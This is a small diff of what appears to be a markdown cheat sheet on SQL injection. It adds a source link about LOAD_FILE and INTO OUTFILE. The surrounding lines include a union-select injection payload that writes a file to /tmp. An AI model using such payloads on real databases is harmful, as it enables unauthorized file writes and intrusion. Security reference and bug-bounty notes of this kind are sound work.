@@ -28,6 +28,7 @@ ___
 ' and 1=2 union all select 'blablabla_bug_bounty_program' into outfile '/tmp/blablabla'--
 
 ```
+Source: https://infosecwriteups.com/sql-injection-with-load-file-and-into-outfile-c62f7d92c4e2
 ### Examples
 ```sql
 
